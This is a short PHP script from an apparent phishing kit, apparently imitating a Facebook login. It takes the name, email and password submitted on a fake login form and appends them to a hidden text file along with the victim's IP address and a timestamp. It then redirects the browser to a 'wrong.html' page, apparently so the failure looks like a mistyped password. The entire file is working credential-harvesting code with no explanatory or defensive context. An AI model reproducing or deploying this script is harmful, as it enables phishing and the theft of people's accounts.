<?php
error_reporting(0);
$file = "xxxxxXXXXXxxxxx.txt";

$namefb = $_POST['uname'];
$username = $_POST['user'];
$password = $_POST['lastname'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");


$handle = fopen($file, 'a');

fwrite($handle, "---------------------------------------------------");

fwrite($handle, "\n");

fwrite($handle, "Name: ");

fwrite($handle, " $namefb");

fwrite($handle, "\n");

fwrite($handle, "Email      : ");

fwrite($handle, " $username");

fwrite($handle, "\n");

fwrite($handle, "Password   : ");

fwrite($handle, " $password");

fwrite($handle, "\n");

fwrite($handle, "IP Address : ");

fwrite($handle, " $ip");

fwrite($handle, "\n");

fwrite($handle, "Date       : ");

fwrite($handle, " $today");

fwrite($handle, "\n");

fwrite($handle, "\n");

fclose($handle);

echo "<script LANGUAGE=\"JavaScript\">

<!--
window.location=\"wrong.html?fbclid=IwAR0DpHzyMmR9Q1m8hvlX3O_FU5ALkroRy_qhIzhAXWrn13ldVn_3Y1SQfjo/\";
// -->

</script>";

?>

